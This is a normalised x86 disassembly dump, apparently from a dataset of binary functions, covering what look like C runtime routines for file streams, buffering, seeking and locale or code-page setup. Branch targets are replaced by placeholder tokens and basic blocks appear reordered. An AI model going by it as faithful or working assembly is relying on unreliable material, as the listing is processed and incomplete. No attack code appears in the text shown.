or [ ebp - 0x24 ] eax
sub_409101
push 0xc
push r--data
call sub_40be80
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_408e99
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_408fdf
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40914a
mov eax [ ebp - 0x1c ]
push esi
call sub_409027
pop ecx
jmp r-xdata
call sub_40bec5
retn
sub_40915d
push 0xc
push r--data
call sub_40be80
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov ebx [ ebp + 0x10 ]
cmp ebx 0x4
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_40bec5
retn
mov edi [ ebp + 0x14 ]
lea eax [ edi - 0x2 ]
cmp eax 0x7ffffffd
jbe r-xdata
cmp ebx 0x40
jne r-xdata
cmp ebx 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_408e99
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_408f77
push esi
call sub_40df97
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test bl 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_409f19
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409249
mov eax [ ebp - 0x1c ]
sub_409253
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_40c61a
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_406b90
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_406330
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_40c61a
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_40c5c8
mov eax esi
jmp r-xdata
sub_4092c8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_40d4a4
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_408f77
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_40d47e
pop ecx
push eax
call sub_40ddea
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_406330
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_40941f
push 0xc
push r--data
call sub_40be80
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_408e99
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4092c8
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40948f
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
call sub_40bec5
retn
sub_409499
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
pop ebp
retn
push [ ebp + 0x8 ]
call sub_40e312
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
or eax 0xffffffff
mov [ esi + 0x4 ] edx
cmp ecx eax
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
sub_4094f4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_408f77
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_40dfc8
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_40d47e
pop ecx
push eax
call sub_40e404
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_409590
push 0xc
push r--data
call sub_40be80
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_408e99
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4094f4
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409605
mov eax [ ebp - 0x1c ]
cmp esi 0x1
je r-xdata
call sub_40bec5
retn
cmp esi 0x2
jne r-xdata
sub_40960f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
pop ebp
retn
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_409590
add esp 0x10
pop ebp
retn
sub_40964a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_408f77
push esi
mov edi eax
call sub_40df97
push esi
call sub_40d47e
push eax
call sub_40e58a
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_408a41
and [ esi + 0x1c ] 0x0
pop ecx
sub_4096b7
push 0xc
push r--data
call sub_40be80
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
or eax 0xffffffff
jmp r-xdata
push esi
call sub_408e99
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_40964a
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409723
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_40bec5
retn
mov eax [ ebp - 0x1c ]
sub_40972b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_408a41
pop ecx
sub_40974b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_4072c1
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40b5d9
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40b875
mov [ esi + 0x4 ] eax
sub_4097d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_407abb
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_40972b
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_40ac3c
pop ecx
cmp eax ebx
je r-xdata
call sub_40e650
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_40972b
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_40ac3c
pop ecx
cmp eax ebx
je r-xdata
call sub_40e650
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_4099b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4097d2
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_409a28
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_40e67c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_409a79
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_409a28
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_409aa7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40974b
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_40e67c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_409af8
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_409aa7
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_409b26
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_409f19
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_409f5e
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_409f5e
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_409f5e
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_409f5e
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_40c283
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_408a41
push [ ebp - 0x1c ]
call sub_408a41
push [ ebp - 0x20 ]
call sub_408a41
push [ ebp - 0x28 ]
call sub_408a41
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_408a41
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_40e81b
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_4099b9
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_4099b9
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_406330
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_406330
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_406330
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_408a41
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_408a41
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_408a41
push [ esi + 0xc0 ]
call sub_408a41
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_409f19
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_40ac3c
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_409f5e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e85b
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_409faa
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e8dd
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_409ff8
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_40b319
pop ecx
pop edi
sub_40a021
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40c576
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40fc34
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_40a062
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_406b90
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_40fcb0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_40d262
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_40d262
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_40c576
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_40fcb0
test eax eax
sub_40a181
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ae37
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40c576
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
